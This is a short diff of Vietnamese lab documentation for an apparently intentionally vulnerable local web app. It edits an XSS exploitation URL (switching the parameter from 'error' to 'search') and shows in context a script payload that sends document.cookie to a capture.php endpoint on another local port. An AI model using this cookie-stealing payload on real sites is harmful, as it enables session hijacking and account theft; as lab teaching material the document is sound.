@@ -121,7 +121,7 @@ Các tài khoản được tạo sẵn:
 
 **Cách khai thác:**
 ```
-http://localhost:8080/dashboard.php?error=<script>alert('XSS')</script>
+http://localhost:8080/dashboard.php?search=<script>alert('XSS')</script>
 ```
 <script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
 
